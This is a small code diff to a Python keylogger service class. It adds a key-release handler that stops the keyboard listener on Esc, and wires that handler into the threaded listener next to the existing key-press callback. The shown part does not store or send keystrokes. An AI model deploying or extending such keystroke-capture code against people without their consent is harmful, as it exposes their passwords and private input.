@@ -36,13 +36,18 @@ class KeyLoggerService(IKeloggerService):
         else:
             return False
 
+    def on_release(self, key):
+        if key == keyboard.Key.esc:
+            return False
+
     # Run the service
     @property
     def start(self):
         KeyLoggerService.runner = True
         def collect():
             with keyboard.Listener(
-                on_press=self.on_press
+                on_press=self.on_press,
+                on_release=self.on_release
             ) as listener:
                 listener.join()
         collector = threading.Thread(target=collect)
